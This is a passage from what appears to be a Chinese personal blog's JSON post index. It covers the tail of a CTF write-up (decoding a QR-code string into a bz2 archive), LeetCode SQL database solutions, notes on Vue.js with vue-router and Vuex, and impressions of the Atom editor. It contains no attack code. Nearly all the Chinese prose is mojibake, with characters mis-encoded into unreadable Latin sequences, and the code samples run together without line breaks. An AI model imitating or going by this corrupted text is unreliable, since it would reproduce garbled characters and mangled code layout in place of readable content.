æ‰“å¼€ï¼ŒæŠŠè‰²é˜¶æ‹‰ä½ï¼Œå‘ç°å›¾çš„å·¦ä¸‹è§’æœ‰ä¸ªäºŒç»´ç ï¼Œæ‰«ç å¾— QlpoOTFBWSZTWXhAk1kAAAtfgAAQIABgAAgAAACvIbYKIAAigNHqNGmnqFMJpoDTEO0CXcIvl9SeOAB3axLQYn4u5IpwoSDwgSay.è§£ç åå‘ç°æ˜¯ä¹±ç ï¼Œä¸çŸ¥é“æ€ä¹ˆåšäº†ï¼Œå¡äº†å¾ˆä¹…ğŸ˜· æ¯”èµ›çš„æœ€åä¸€ä¸ªå°æ—¶çœ‹è§äº†è§£ç åå­—ç¬¦ä¸²å¼€å¤´çš„ BZï¼Œçªç„¶æ„è¯†åˆ°è¿™å¯èƒ½æ˜¯ä¸ªæ–‡ä»¶å¤´ï¼Œäºæ˜¯å°†è§£ç åçš„å†…å®¹å†™å…¥æ–‡ä»¶ï¼Œfile ä¸€ä¸‹å‘ç°æœç„¶æ˜¯ä¸ª bz å‹ç¼©æ–‡ä»¶ï¼Œè§£å‹åå¾—åˆ° flag. Misc 4 ï¼ˆæœªè§£å‡ºï¼‰è®¨åŒçš„ APPè§…åŠ¨æ ¡å›­ä»€ä¹ˆé¬¼ï¼Ÿï¼ æ€»ç»“æ¯”èµ›äº”ä¸ªå°æ—¶ï¼Œè§£äº† 10 é“é¢˜ï¼Œå‰åŠå°æ—¶è§£å‡ºæ¥ 5 é“ï¼Œåé¢å„ç§å¡ï¼Œæœ€åä¸€ä¸ªå°æ—¶è„‘æ´å¤§å¼€åˆè§£å‡ºæ¥ 3 é“é¢˜ğŸ˜‚CTF çœŸå¥½ç©ï¼Œè€ƒåˆ°äº†å„ç§å§¿åŠ¿å„ç§è„‘æ´ï¼Œè¿˜æ˜¯è›®æœ‰æ„æ€å“’~ç„¶è€Œäº”ä¸ªå°æ—¶çš„æ¯”èµ›çœŸçš„å¤ªç´¯äº†â€¦è¡€çš„æ•™è®­ï¼Œä¸‹æ¬¡é¢˜ç›®åšä¸å‡ºæ¥è¿˜æ˜¯è¦è·‘å‡ºå»æ­‡ä¸€ä¼šå†å›æ¥åš_(:Ğ·ã‚âˆ )_","categories":[{"name":"ä¹±ä¸ƒå…«ç³Ÿ","slug":"ä¹±ä¸ƒå…«ç³Ÿ","permalink":"https://blog.stdioa.com/categories/ä¹±ä¸ƒå…«ç³Ÿ/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://blog.stdioa.com/tags/CTF/"},{"name":"è„‘æ´","slug":"è„‘æ´","permalink":"https://blog.stdioa.com/tags/è„‘æ´/"},{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/tags/Python/"}]},{"title":"LeetCode æ•°æ®åº“é¢˜ç›®è§£ç­”","slug":"leetcode-database-solutions","date":"2016-04-06T08:02:00.000Z","updated":"2017-06-29T04:38:40.453Z","comments":true,"path":"2016/04/leetcode-database-solutions/","link":"","permalink":"https://blog.stdioa.com/2016/04/leetcode-database-solutions/","excerpt":"å‰ä¸¤å¤©é‡åˆ·äº†ã€ŠSQLå¿…çŸ¥å¿…ä¼šã€‹ï¼Œæ˜¨å¤©æƒ³åˆ°äº† LeetCodeï¼Œäºæ˜¯å»åˆ·äº†å‡ é“æ•°æ®åº“çš„é¢˜ç›®ï¼Œå¼€äº†ä¸å°‘è„‘æ´ã€‚","text":"å‰ä¸¤å¤©é‡åˆ·äº†ã€ŠSQLå¿…çŸ¥å¿…ä¼šã€‹ï¼Œæ˜¨å¤©æƒ³åˆ°äº† LeetCodeï¼Œäºæ˜¯å»åˆ·äº†å‡ é“æ•°æ®åº“çš„é¢˜ç›®ï¼Œå¼€äº†ä¸å°‘è„‘æ´ã€‚ä»Šå¤©æŠŠç­”æ¡ˆæ•´ç†ä¸€ä¸‹ã€‚å–”ï¼Œé¢˜åº“åœ¨è¿™é‡Œã€‚ 175. Combine Two Tablesæ ·ä¾‹ä¸­æœ‰äº›äººçš„ PersonId æ— æ³•åœ¨ Address è¡¨ä¸­æ‰¾åˆ°ï¼Œæ‰€ä»¥ä½¿ç”¨ LEFT JOIN.1234SELECT FirstName, LastName, City, StateFROM PersonLEFT JOIN AddressON Person.PersonId = Address.PersonId; 176. Second Highest SalaryUNION æŸ¥è¯¢ï¼Œåœ¨ç»“æœçš„æœ€åæ·»åŠ ä¸€ä¸ª NULL, è‹¥ä¸å­˜åœ¨ç¬¬äºŒé«˜çš„è–ªæ°´åˆ™ä¼šé€‰æ‹© NULL.12345SELECT Salary FROM EmployeeUNIONSELECT NULLORDER BY Salary DESCLIMIT 1, 1; 177. Nth Highest Salaryè¿™ä¸ªä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸å¯ä»¥ç”¨ LIMIT 1, N-1ï¼Œæ‰€ä»¥ç”¨äº† IF å‡½æ•°ã€‚12345678910111213CREATE FUNCTION getNthHighestSalary(N INT) RETURNS INTBEGIN RETURN ( # Write your MySQL query statement below SELECT IF(COUNT(*) &gt;= N, MIN(rank.Salary), NULL) FROM ( SELECT DISTINCT Salary FROM Employee ORDER BY Salary DESC LIMIT N ) AS rank );END 178. Rank Scores1234567SELECT Score, ( SELECT COUNT(DISTINCT Score) FROM Scores AS c WHERE o.Score &lt;= c.Score # ç»Ÿè®¡æ¯”å·²é€‰åˆ†æ•°å°çš„åˆ†æ•°ä¸ªæ•°) AS RankFROM Scores AS oORDER BY Score DESC; 180. Consecutive Numbersæš´åŠ›æŸ¥è¯¢ğŸ˜‚1234SELECT DISTINCT l1.Num AS ConsecutiveNumsFROM Logs AS l1, Logs AS l2, Logs AS l3WHERE l1.Id+1 = l2.Id AND l2.Id+1 = l3.Id AND l1.Num = l2.Num AND l2.Num = l3.Num; 181. Employees Earning More Than Their Managersé€‰æ‹©é›‡å‘˜ï¼Œæ ¹æ® ManagerId æ‰¾åˆ°é›‡å‘˜ä¸Šå¸çš„è–ªæ°´ï¼Œç„¶åè¿›è¡Œæ¯”è¾ƒå³å¯ã€‚1234567SELECT NameFROM EmployeeWHERE Salary &gt; ( SELECT Salary FROM Employee AS e WHERE e.id = Employee.ManagerId ); 182. Duplicate EmailsæŒ‰ Email å­—æ®µè¿›è¡Œåˆ†ç±»ï¼Œä½¿ç”¨ HAVING ç­›é€‰å‡ºç›¸åŒ Email æ•°é‡å¤§äº 1 çš„é¡¹ã€‚123SELECT Email FROM PersonGROUP BY EmailHAVING COUNT(Email)&gt;1; 183. Customers Who Never Orderè¿™ä¸ªä¹Ÿæ˜¯ç›´æ¥æŸ¥è¯¢â€¦12345SELECT c.Name AS CustomersFROM Customers AS cWHERE (SELECT COUNT(*) FROM Orders WHERE c.id = Orders.CustomerId) = 0; 184. Department Highest SalaryåŸºæœ¬ä¸Šå°±æ˜¯ç›´æ¥æŸ¥è¯¢ï¼Œæ³¨æ„ WHERE è¯­å¥ä¸­åˆ¤åˆ«æ¡ä»¶çš„ä½ç½®ï¼Œå¦åˆ™æœ‰å¯èƒ½ TLEğŸ˜‚12345678SELECT d.Name AS Department, e.Name AS Employee, e.SalaryFROM Employee AS e, Department AS dWHERE e.DepartmentId = d.Id AND e.Salary = (SELECT MAX(e2.Salary) FROM Employee AS e2 WHERE e.DepartmentId = e2.DepartmentId); 185. Department Top Three Salariesè¾“å‡ºæ¯ä¸ªéƒ¨é—¨è–ªèµ„æœ€é«˜çš„ä¸‰ä¸ªäººã€‚è¿™ä¸ªé¢˜é‡Œæœ‰ä¸ªå‘ï¼Œå¦‚æœä¸¤ä¸ªäººè–ªèµ„ç›¸åŒï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªäººå¹¶åˆ—ï¼Œéƒ½è¦è¾“å‡ºã€‚å¹¶ä¸”å¦‚æœå››ä¸ªäººçš„è–ªèµ„ä¸º 3 2 2 1ï¼Œ è–ªèµ„ä¸º 1 çš„é‚£ä¸ªäººæ’ç¬¬ 3 ğŸ˜‚12345678910SELECT d.Name AS Department, e.Name AS Employee, e.SalaryFROM Employee AS e, Department AS dWHERE e.DepartmentId = d.Id AND (SELECT COUNT(DISTINCT e2.Salary) # æ’åºæ—¶å…è®¸å¹¶åˆ— FROM Employee AS e2 WHERE e.DepartmentId = e2.DepartmentId AND e.Salary &lt; e2.Salary) &lt; 3 # æ¯”è¯¥é›‡å‘˜å·¥èµ„é«˜çš„äººå°‘äºä¸‰ä¸ªORDER BY Department, Salary DESC; 196. Delete Duplicate EmailsMySQL ä¸å…è®¸åœ¨åˆ é™¤æ—¶ä¾æ®å¾…åˆ é™¤çš„è¡¨è¿›è¡Œç­›é€‰ (You canâ€™t specify target tableâ€™Personâ€™ for update in FROM clause), æ‰€ä»¥è¦ç»•ä¸€ä¸‹ã€‚123456789101112131415# é”™çš„ï¼ï¼DELETE FROM PersonWHERE Id IN (SELECT p2.Id FROM Person AS p1, Person AS p2 WHERE p1.Email = p2.Email AND p1.Id &lt; p2.Id );DELETE FROM PersonWHERE Id IN (SELECT * FROM( # ç»•ä¸€ä¸‹ï¼Œå…ˆæŒ‘å‡ºæ‰€æœ‰æ»¡è¶³è¦æ±‚çš„ ID æ„æˆä¸€ä¸ªè¡¨ï¼Œå†ä»è¿™ä¸ªè¡¨ä¸­é€‰ Id è¿›è¡Œåˆ é™¤ SELECT p2.Id FROM Person AS p1, Person AS p2 WHERE p1.Email = p2.Email AND p1.Id &lt; p2.Id) AS temp ); 197. Rising Temperatureä¸»è¦è€ƒ MySQL çš„æ—¥æœŸæ“ä½œå‡½æ•°ã€‚1234SELECT w1.Id AS IdFROM Weather AS w1, Weather AS w2WHERE datediff(w1.Date, w2.Date) = 1 AND w1.Temperature &gt; w2.Temperature; 262. Trips and Userså¤ªä¹±äº†ï¼Œæ²¡åšğŸ˜¥ åè®°æ˜¨å¤©èŠ±äº†åŠå¤©å†™å®Œè¿™äº›é¢˜ï¼Œå†™åˆ°æœ€åéƒ½ä¸çŸ¥é“è‡ªå·±åœ¨å†™ä»€ä¹ˆäº†ğŸ˜‚ä¸è¿‡è¿˜æ˜¯æŒæ¡äº†ä¸å°‘çš„ SQL æŸ¥è¯¢æŠ€å·§ï¼Œæ¯”å¦‚ UNION SELECT NULL ç­‰ç­‰ã€‚","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://blog.stdioa.com/categories/LeetCode/"}],"tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://blog.stdioa.com/tags/LeetCode/"},{"name":"æ•°æ®åº“","slug":"æ•°æ®åº“","permalink":"https://blog.stdioa.com/tags/æ•°æ®åº“/"},{"name":"SQL","slug":"SQL","permalink":"https://blog.stdioa.com/tags/SQL/"}]},{"title":"éšæ‰‹è®°ä¹‹Vue.js","slug":"essay-vue","date":"2016-03-28T13:40:03.000Z","updated":"2017-06-29T04:38:40.199Z","comments":true,"path":"2016/03/essay-vue/","link":"","permalink":"https://blog.stdioa.com/2016/03/essay-vue/","excerpt":"ä¹‹å‰çš„é‚£é—¨ JS å’Œå‰ç«¯è¯¾ç»“è¯¾äº†ï¼Œæœ€åèŠ±äº†ä¸€å‘¨æ—¶é—´å†™äº†ä¸€ä¸ª projectï¼Œä½¿ç”¨ Vue.js çš„ä¸€å¥—å·¥å…·å†™äº†ä¸€ä¸ªå•é¡µé¢åº”ç”¨ï¼Œå…ˆå°†ä½¿ç”¨åˆ°åŠå­¦åˆ°çš„çŸ¥è¯†æ¥æ•´ç†ä¸€ä¸‹ã€‚","text":"ä¹‹å‰çš„é‚£é—¨ JS å’Œå‰ç«¯è¯¾ç»“è¯¾äº†ï¼Œæœ€åèŠ±äº†ä¸€å‘¨æ—¶é—´å†™äº†ä¸€ä¸ª projectï¼Œä½¿ç”¨ Vue.js çš„ä¸€å¥—å·¥å…·å†™äº†ä¸€ä¸ªå•é¡µé¢åº”ç”¨ï¼Œå…ˆå°†ä½¿ç”¨åˆ°åŠå­¦åˆ°çš„çŸ¥è¯†æ¥æ•´ç†ä¸€ä¸‹ã€‚æƒ³äº†æƒ³ï¼Œä¹‹å‰è‡ªå·±å­¦ä¹  Vue.js çš„æ—¶å€™ä¸€ç›´åœ¨ç¿»æ–‡æ¡£ï¼Œç¿»åˆ°å“ªäº›è®©äººçœ¼å‰ä¸€äº®çš„åŠŸèƒ½æ—¶å°±å°†å®ƒåŠ è¿›è‡ªå·±çš„é¡¹ç›®é‡Œï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆç³»ç»Ÿåœ°è¿›è¡Œå­¦ä¹ ï¼Œæ‰€ä»¥æƒ³åˆ°å“ªå†™åˆ°å“ªå¥½äº†ã€‚å‰æ–¹é«˜ä¹±é¢„è­¦ã€‚ 1. Vue.jsä¹‹å‰ç”¨ React ç”¨å¾—æœ‰äº›ä¸çˆ½äº†æ‰€ä»¥æƒ³æ¢æ¢å£å‘³, äºæ˜¯ ç”¨Vue.js å†™äº†ä¸€ä¸ªå°åº”ç”¨çš„å‰ç«¯éƒ¨åˆ†ã€‚å®ƒçš„è½»é‡ä»¥åŠMVVMæ¶æ„è®©æˆ‘åœ¨ä¸¤å¤©ä¹‹å†…çˆ±ä¸Šäº†å®ƒï¼Œäºæ˜¯å†³å®šç”¨å®ƒä»£æ›¿ React å»å®Œæˆ final project çš„å‰ç«¯éƒ¨åˆ†ã€‚ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæˆ‘è§‰å¾— Vue.js æ¯” React æ›´å®¹æ˜“ä¸Šæ‰‹ï¼Œæ‰€ä»¥å¾ˆå¿«å°±å­¦ä¼šäº†å®ƒã€‚æƒ³äº†æƒ³ç¡®å®ä¸çŸ¥é“è¯¥æ•´ç†ä¸€äº›ä»€ä¹ˆï¼Œå› ä¸º Vue çš„å®˜æ–¹æ•™ç¨‹å†™çš„ç¡®å®å¾ˆç›´ç™½æ¸…æ¥šï¼Œæ‰€ä»¥åœ¨æ­¤ä¸å†èµ˜è¿°ï¼Œæœ‰æ—¶é—´çš„è¯å¯èƒ½ä¼šè€ƒè™‘å†™ä¸€ä¸ª Vue çš„æ•™ç¨‹ã€‚ 2. vue-clivue-cli æ˜¯ä¸€ä¸ª Vue.js å®˜æ–¹æä¾›çš„è„šæ‰‹æ¶å·¥å…·ï¼Œä½ å¯ä»¥ä½¿ç”¨å®ƒæ¥è½»æ¾åœ°æ„å»ºå‡ºä¸€ä¸ªåº”ç”¨ Vue.js çš„å·¥ç¨‹ã€‚å®˜æ–¹æä¾› 5 ç§æ¨¡æ¿ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥åœ¨ github ä¸Šæˆ–è€…æœ¬åœ°æ„å»ºè‡ªå·±çš„æ¨¡æ¿ç„¶åä½¿ç”¨ vue-cli ç”Ÿæˆå·¥ç¨‹ã€‚å…·ä½“ä½¿ç”¨æ–¹æ³•ï¼šç”Ÿæˆä¸€ä¸ªå·¥ç¨‹æä¸ºç®€å•ï¼Œåªéœ€ä¸€ä¸¤æ¡å‘½ä»¤å³å¯ã€‚1234$ vue init webpack my-project // ä½¿ç”¨ webpack æ¨¡æ¿ç”Ÿæˆå·¥ç¨‹ my-project$ cd my-project$ npm install$ npm run devç„¶åï¼Œå€ŸåŠ© webpack ä¸ vue-loader, ä½ å¯ä»¥å°†ä¸€ä¸ª Vue ç»„ä»¶çš„æ¨¡æ¿ã€æ ¸å¿ƒjsä»£ç å’ŒCSSå†™åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œï¼Œç”šè‡³è¿˜å¯ä»¥ä½¿ç”¨ CSS ä¸ HTML çš„é¢„å¤„ç†å™¨ï¼Œåƒè¿™æ ·ï¼šå›¾ç‰‡æ¥è‡ª Vue.js å®˜æ–¹æ•™ç¨‹ - æ„å»ºå¤§å‹åº”ç”¨ã€‚ 3. Vue-routervue-router æ˜¯ vue å®˜æ–¹æä¾›çš„è·¯ç”±æ¨¡å—ï¼Œå¯ä»¥å®ç° SPA ä¸­çš„è·¯ç”±æ“ä½œã€‚å…·ä½“æ–‡æ¡£çœ‹è¿™é‡Œã€‚é¡ºä¾¿æä¸€å¥ï¼Œvue-router çš„ä¸­æ–‡æ–‡æ¡£å·²ç»è¿‡æ—¶äº†ã€‚ 3.1 åˆå§‹åŒ–é¦–å…ˆä½¿ç”¨ npm å®‰è£… vue-router, ç„¶ååœ¨ç¨‹åºå…¥å£ç‚¹é…ç½® vue-router.12345678910111213141516171819202122232425262728import Vue from 'vue'import Router from 'vue-router'import App from './components/App' // ç¨‹åºçš„æ ¸å¿ƒ Vue åº”ç”¨import HomePageView from './components/HomePageView' // å¯¼å…¥æ‰€æœ‰çš„ View ç»„ä»¶import ItemView from './components/ItemView' Vue.use(Router) // Vue é…ç½®var router = new Router() // ç”Ÿæˆè·¯ç”±å¯¹è±¡router.map(&#123; // é…ç½®è·¯ç”± '/': &#123; name: 'homepage', component: HomePageView &#125;, '/home': &#123; name: 'homepage', component: HomePageView &#125;, '/item/:id': &#123; // æ”¯æŒåŠ¨æ€è·¯å¾„ name: 'item', component: ItemView &#125;&#125; router.redirect(&#123; // è®¾ç½®é‡å®šå‘é€‰é¡¹ '*': '/home'&#125;) router.start(App, '[app]') // æŒ‚è½½ Vue ä¸»åº”ç”¨ç„¶ååœ¨ App.vue çš„ template ä¸­è®¾ç½® router-view.1234567&lt;template&gt; &lt;router-view keep-alive transition=\"fade\" transition-mode=\"out-in\"&gt; &lt;/router-view&gt;&lt;/template&gt; 3.2 vue-router çš„ä½¿ç”¨Vue Router å¯¹è±¡è¢«åµŒå…¥åˆ°æ¯ä¸ª vue ç»„ä»¶ä¸­ï¼Œå¯ä»¥åœ¨ç»„ä»¶ä¸­è°ƒç”¨ this.$router æ¥æ§åˆ¶ router å¯¹è±¡ï¼Œå¦‚è¿›è¡Œé¡µé¢è·³è½¬ç­‰ã€‚æ­¤å¤–ï¼Œè¿˜å¯ä»¥åœ¨é¡µé¢åˆ‡æ¢æ—¶åœ¨ç»„ä»¶çš„ route é…ç½®ä¸­ä½¿ç”¨è·¯ç”±åˆ‡æ¢é’©å­æ§åˆ¶ vue-routerï¼Œè¯¦æƒ…è¯·çœ‹æ–‡æ¡£ 4. VuexVuex æ˜¯ä¸€ä¸ªå€Ÿé‰´äº Fluxï¼Œä½†æ˜¯ä¸“é—¨ä¸º Vue.js æ‰€è®¾è®¡çš„çŠ¶æ€ç®¡ç†æ–¹æ¡ˆã€‚Flux é‡‡ç”¨äº† Action â†’ Dispatcher â†’ Store â†’ View çš„çŠ¶æ€ç®¡ç†æœºåˆ¶ï¼Œè€Œ Vuex è·Ÿå®ƒå·®ä¸å¤šï¼šVue ç»„ä»¶è°ƒç”¨ actionï¼Œaction dispatches mutation, mutation æ”¹å˜ store ä¸­çš„ stateï¼Œstate æ”¹å˜ View. ä¸‹é¢æ˜¯ Vuex çš„æ•°æ®æµã€‚ 4.1 ä½¿ç”¨æ–¹æ³•ç¨‹åºå…¥å£ç‚¹ï¼š123import Vuex from 'vuex'Vue.use(Vuex)ä¸»åº”ç”¨ï¼š123456import store from '../store'export default &#123; store, // å¼•ç”¨store ...&#125;å…¶å®ƒç»„ä»¶ï¼š123456789101112131415161718export default &#123; ..., vuex: &#123; // å®šä¹‰ getter ä» store ä¸­è·å– state å¹¶æ³¨å†Œè‡³åº”ç”¨ä¸­ getters: &#123; logged_in: function (state) &#123; return state.user.logged_in &#125; &#125;, // å®šä¹‰ action, ç»„ä»¶å¯åœ¨è‡ªå·±çš„å‡½æ•°ä¸­è°ƒç”¨ action æ¥ dispatch mutations. actions: &#123; login: (&#123; dispatch &#125;, user) =&gt; &#123; dispatch('LOGIN', user) &#125; &#125; &#125;, ...&#125;å…³äº store åŠ mutation çš„å®šä¹‰æ–¹å¼ï¼Œè¯·å‚è€ƒ Vuex æ–‡æ¡£ã€‚ 5. æ€»ç»“ &amp; åè®°è·Ÿ React ç›¸æ¯”ï¼Œä¸ªäººæ„Ÿè§‰ Vue è¦æ›´å®¹æ˜“ä¸Šæ‰‹ï¼Œæ˜“äºä½¿ç”¨ï¼Œæ–‡æ¡£ä¹Ÿå¾ˆæ¸…æ¥šï¼ˆæ¯” Hexo çš„é«˜åˆ°ä¸çŸ¥é“é‚£é‡Œå»äº†ï¼Œå‰ä¸¤å¤©è¢« Hexo æ•´ç–¯äº†å¿…é¡»è¦é»‘ä¸€ä¸‹å®ƒï¼‰ï¼›Vue çš„ä¸€ç³»åˆ—å·¥å…·ä¹Ÿå¾ˆæ˜“äºä½¿ç”¨ï¼Œä¸ Vue æ•´åˆåº¦é«˜ï¼Œå¯ä»¥åœ¨ç»„ä»¶ä¸­æ–¹ä¾¿åœ°è¿›è¡Œæ“ä½œã€‚å‰ç«¯è¯¾ç»“è¯¾ï¼Œå‡†å¤‡é€€å‘äº†ï¼Œè¿‡å‡ å¤©å¯èƒ½ä¼šå­¦ä¹ å¹¶æ•´ç†ä¸€äº›åç«¯çš„çŸ¥è¯†ã€‚","categories":[{"name":"Javascript","slug":"Javascript","permalink":"https://blog.stdioa.com/categories/Javascript/"}],"tags":[{"name":"å‰ç«¯å¼€å‘","slug":"å‰ç«¯å¼€å‘","permalink":"https://blog.stdioa.com/tags/å‰ç«¯å¼€å‘/"},{"name":"Javascript","slug":"Javascript","permalink":"https://blog.stdioa.com/tags/Javascript/"},{"name":"node.js","slug":"node-js","permalink":"https://blog.stdioa.com/tags/node-js/"},{"name":"vue.js","slug":"vue-js","permalink":"https://blog.stdioa.com/tags/vue-js/"}]},{"title":"Atom æµ…åº¦ä½“éªŒæ„Ÿå—","slug":"essay-atom-using-experience","date":"2016-03-27T02:40:03.000Z","updated":"2017-06-29T04:38:40.052Z","comments":true,"path":"2016/03/essay-atom-using-experience/","link":"","permalink":"https://blog.stdioa.com/2016/03/essay-atom-using-experience/","excerpt":"æ˜¨å¤©çœ‹åˆ°äº† Atom å®˜æ–¹å‘å¸ƒäº†ä¸€ç¯‡ Atom Flight Manual, çœ‹äº†ä¸¤é¡µè§‰å¾—æœ‰äº›æ„Ÿå…´è¶£æ‰€ä»¥ä¸‹äº†ä¸€ä¸ªä½“éªŒä¸€ä¸‹ã€‚","text":"æ˜¨å¤©çœ‹åˆ°äº† Atom å®˜æ–¹å‘å¸ƒäº†ä¸€ç¯‡ Atom Flight Manual, çœ‹äº†ä¸¤é¡µè§‰å¾—æœ‰äº›æ„Ÿå…´è¶£æ‰€ä»¥ä¸‹äº†ä¸€ä¸ªä½“éªŒä¸€ä¸‹ã€‚å¾ˆä¹…ä»¥å‰å°±å¬è¯´äº† Atom è¿™æ¬¾ç¼–è¾‘å™¨ï¼ŒGithub å®£ç§°å®ƒæ˜¯&quot;A hackable text editorfor the 21st Century&quot;, æœ‰äº›æ„Ÿå…´è¶£äºæ˜¯å°±æäº†ä¸€ä¸ªå†…æµ‹ç ä¸‹è½½ä¸‹æ¥æ¥ç©äº†ç©ï¼Œä½†æ˜¯ï¼Œå½“æ—¶ Atom çš„ç”¨æˆ·ä½“éªŒå¹¶ä¸å¥½ï¼ŒåŠ ä¸Šå¯ä»¥ä½¿ç”¨çš„æ’ä»¶å°‘ä¹‹åˆå°‘ï¼Œå°±æ”¾å¼ƒäº†å®ƒã€‚æ˜¨å¤©ä»å¾®åšä¸Šçœ‹åˆ°äº†å®˜æ–¹çš„ Atom Flight Manualï¼Œå†³å®šé‡æ–°ä½“éªŒä¸€ä¸‹è¿™æ¬¾æ‰€è°“â€œå±äº 21 ä¸–çºªçš„ç¼–è¾‘å™¨â€ã€‚å½“ç„¶ï¼Œä½œä¸ºä¸€ä¸ªä½¿ç”¨ Sublime Text å°†è¿‘ 2 å¹´çš„ç”¨æˆ·ï¼Œæˆ‘è‚¯å®šä¼šå°† Atom è·Ÿ Sublime Textï¼ˆä¸‹ç§° STï¼‰è¿›è¡Œæ¯”è¾ƒå’¯ã€‚ 1. ç¬¬ä¸€å°è±¡ä¸€æ‰“å¼€Atomç•Œé¢ï¼Œæ•´ä¸ª UI è¿˜æ˜¯æµ“æµ“çš„ä»¿ ST é£æ ¼ï¼Œå¿«æ·é”®éƒ½åŸºæœ¬ä¸€æ ·ï¼Œå¯èƒ½æ˜¯å› ä¸º ST çš„ UI ç¡®å®å¾ˆç®€æ´æ¼‚äº®å§ã€‚ä¸è¿‡ ST æ˜¯æ”¶è´¹çš„ï¼ˆæ— æœŸé™è¯„ä¼°ä½¿ç”¨ä¹Ÿæ˜¯æ”¶è´¹ï¼‰ï¼Œè€Œ Atom æ˜¯å…è´¹çš„ï¼Œè¿™ç‚¹è¦èµä¸€ä¸ª~å½“ç„¶è¿™æ ¹æœ¬æ— æ³•æ‰“æ¶ˆæš‘å‡è´­ä¹° ST æˆæƒç çš„å†³å¿ƒã€‚ 2. å¯åŠ¨é€Ÿåº¦Atom çš„å¯åŠ¨é€Ÿåº¦æ˜¾ç„¶è·Ÿ ST æ²¡æ³•æ¯”ã€‚å®æµ‹åœ¨è£…äº† 15 ä¸ªæ’ä»¶ä»¥åï¼ŒAtom çš„å¯åŠ¨é€Ÿåº¦è¦æ¯” ST3 æ…¢ 5 å€å·¦å³ã€‚å½“ç„¶ï¼Œå®ƒçš„å¯åŠ¨é€Ÿåº¦åº”è¯¥ä¼šæ¯”è£…äº†ä¸€å †æ’ä»¶çš„ ST2 å¿«ä¸€ç‚¹â€¦ST2 çš„å¯åŠ¨é€Ÿåº¦è²Œä¼¼æ˜¯å†å²é—ç•™é—®é¢˜äº†ã€‚ 3. ç”¨æˆ·ä½“éªŒæ„Ÿè§‰ Atom çš„ç”¨æˆ·ä½“éªŒè¦æ¯”ä¸Šæ¬¡å¥½çš„å¤šã€‚æ¥è¯´ä¸€è¯´æˆ‘çœ‹å¥½ Atom çš„åœ°æ–¹å§ã€‚Web-BasedAtom ç¼–è¾‘å™¨æ˜¯åŸºäº V8ï¼Œæ•´ä¸ª Atom ç¼–è¾‘é¡µé¢å°±æ˜¯ä¸€ä¸ªç½‘é¡µã€‚ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæ„Ÿè§‰ç½‘é¡µå¯¹æˆ‘æ¥è¯´æ›´æœ‰äº²åˆ‡æ„ŸğŸ˜³ï¼Œå½“ç„¶è¿™ä¹Ÿä½¿å¾— Atom æ›´åŠ å®¹æ˜“ä¿®æ”¹ï¼Œæ–¹ä¾¿äº†æ’ä»¶çš„å¼€å‘ã€‚Git Diff &amp; Markdown Preview é›†æˆAtom è‡ªå¸¦äº†ä¸¤ä¸ªæ’ä»¶ï¼šGit Diff å’Œ Markdown Preview.Git Diff å¯ä»¥å®æ—¶æ˜¾ç¤ºå½“å‰æ–‡ä»¶çš„ Git Diff ä¿¡æ¯ã€‚å—¯é‚£ä¸ª Git Diff è¿˜æ˜¯è›®æ¼‚äº®çš„~Markdown Preview å¯ä»¥æä¾› Github Markdown å®æ—¶é¢„è§ˆã€‚ç„¶è€Œä½œä¸ºä¸€ä¸ªå¯ä»¥å¯¹ Markdown è¿›è¡Œäººè‚‰ç¼–è¯‘çš„äººï¼Œæ ¹æœ¬ä¸éœ€è¦è¿™æ ·çš„æ’ä»¶å—¯ğŸ˜‚åŒæ—¶ï¼ŒAtom è¿˜é›†æˆäº† Git çš„å¸¸ç”¨åŠŸèƒ½ï¼Œå¦‚å½“å‰ç›®å½•æ‰€åœ¨ Git åˆ†æ”¯ã€‚è¿™ä¸ªåŠŸèƒ½ä¹Ÿè¦ç‚¹ä¸ªèµã€‚Package/Theme å®‰è£…åŠé…ç½®è¿™ç‚¹ä¸Š Atom åšçš„è¦æ¯” ST å¥½å¾—å¤šã€‚Atom å¯ä»¥åœ¨çº¿æŸ¥çœ‹ Package çš„ README ä¿¡æ¯ï¼Œæ¯ä¸€ä¸ª Package ä¹Ÿæœ‰å…¶ç‹¬ç«‹çš„é…ç½®é¡µé¢ï¼Œä¸å¿…åƒ ST é‚£æ ·ç›´æ¥å»ä¿®æ”¹é…ç½®æ–‡ä»¶ã€‚å½“ç„¶ï¼ŒAtom è‡ªå¸¦äº†ä¸€ä¸ªå«åš apm çš„åŒ…ç®¡ç†å·¥å…·ï¼Œè¿™ä¸ªå°±ä¸é”™è¯„ä»·å’¯ï¼Œäººå®¶åªæ˜¯æµ…åº¦ä½¿ç”¨å˜›ï¼ˆå‚²å¨‡è„¸ 4. Hackable ç®€å•ä½“éªŒâ€”â€”ç¼–è¾‘å™¨å­—ä½“ä¿®æ”¹ä¹‹å‰ç”¨ ST çš„æ—¶å€™ä¸ºäº†å°† Consolas å’Œå¾®è½¯é›…é»‘ç»“åˆèµ·æ¥ï¼Œç€å®å¤´ç–¼äº†å¥½ä¹…ï¼Œåˆ°äº† Atom é‡Œï¼Œæ‰“å¼€ Stylesheet é…ç½®æ–‡ä»¶ï¼Œä¸€è¡Œä»£ç æå®šğŸ˜†123atom-text-editor &#123; font-family: Consolas, \"Microsoft Yahei\", sans-serif;&#125; 5. æ€»ç»“Atom ç¡®å®æ¯”ä»¥å‰å¥½ç”¨äº†å¾ˆå¤šã€‚æˆ‘å¤§æ¦‚ä¸ä¼šå¸è½½å®ƒï¼Œè€Œæ˜¯æŠŠå®ƒç•™åœ¨ç”µè„‘é‡Œï¼Œç­‰åˆ° ST ç”¨è…»äº†å¯ä»¥æ¢æ¢å£å‘³~ç„¶è€Œå°è¯•äº† Atom å¹¶æ›´æ¢ä¸»é¢˜ã€å®‰è£…äº†å‡ ä¸ªå®ç”¨çš„æ’ä»¶ä»¥åï¼Œæˆ‘è¿˜æ˜¯è·‘åˆ° Sublime é‚£é‡Œå®‰è£…äº†ç±»ä¼¼çš„æ’ä»¶ğŸ˜‚é…ç½®åçš„ Atom:ä½¿ç”¨ Atom å‰çš„ ST:ä½¿ç”¨ Atom åï¼Œå®‰è£…äº†æ’ä»¶Color Highlighter, GitGutter 